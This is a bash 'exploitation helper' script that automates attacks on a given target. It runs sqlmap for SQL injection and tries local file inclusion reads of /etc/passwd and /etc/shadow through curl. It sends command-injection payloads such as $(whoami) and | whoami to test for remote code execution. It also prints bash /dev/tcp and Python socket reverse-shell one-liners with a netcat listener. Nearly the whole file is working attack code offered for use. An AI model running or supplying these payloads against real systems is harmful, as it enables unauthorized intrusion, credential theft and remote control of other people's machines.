#!/bin/bash
# Exploitation helper: wrapper for common exploitation workflows
# Usage: ./exploit.sh <target-ip> <vulnerability-type> [payload]

TARGET=$1
VULN_TYPE=$2
PAYLOAD=$3

if [ -z "$TARGET" ] || [ -z "$VULN_TYPE" ]; then
    echo "Usage: $0 <target-ip> <vulnerability-type> [payload]"
    echo ""
    echo "Vulnerability types:"
    echo "  sqli          - SQL Injection (requires URL)"
    echo "  lfi           - Local File Inclusion (requires URL and file path)"
    echo "  rce           - Remote Code Execution (requires URL)"
    echo "  shell         - Reverse shell setup"
    echo ""
    echo "Examples:"
    echo "  $0 192.168.1.100 sqli 'http://target/app.php?id=1'"
    echo "  $0 192.168.1.100 lfi 'http://target/app.php?file=' /etc/passwd"
    exit 1
fi

case $VULN_TYPE in
    sqli)
        echo "[*] SQL Injection testing..."
        echo "[*] Target URL: $PAYLOAD"
        
        if command -v sqlmap &> /dev/null; then
            echo "[+] Running sqlmap..."
            sqlmap -u "$PAYLOAD" --dbs
        else
            echo "[-] sqlmap not found. Install it: pip install sqlmap"
            echo "[*] Manual test: Append ' OR '1'='1 to the parameter"
        fi
        ;;
    
    lfi)
        echo "[*] Local File Inclusion testing..."
        echo "[*] Target URL: $PAYLOAD"
        
        FILES=("/etc/passwd" "/etc/shadow" "/var/www/html/index.php" "../../etc/passwd")
        
        for file in "${FILES[@]}"; do
            echo "[*] Attempting: $file"
            curl -s "${PAYLOAD}${file}" | head -5
            echo ""
        done
        ;;
    
    rce)
        echo "[*] Remote Code Execution testing..."
        echo "[*] Target URL: $PAYLOAD"
        echo "[*] Testing command: whoami"
        
        # Test various RCE patterns
        PAYLOADS=(
            "'; system('whoami'); //"
            "\`whoami\`"
            "\$(whoami)"
            "; whoami #"
            "| whoami"
        )
        
        for p in "${PAYLOADS[@]}"; do
            echo "[*] Testing payload: $p"
            curl -s -X POST "$PAYLOAD" -d "cmd=$p" | grep -i "root\|www\|shell" && echo "[+] Possible RCE!"
        done
        ;;
    
    shell)
        echo "[*] Reverse shell setup..."
        echo ""
        echo "Bash:"
        echo "bash -i >& /dev/tcp/$TARGET/4444 0>&1"
        echo ""
        echo "Python:"
        echo "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$TARGET\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
        echo ""
        echo "NC listener: nc -lvnp 4444"
        ;;
    
    *)
        echo "[-] Unknown vulnerability type: $VULN_TYPE"
        exit 1
        ;;
esac
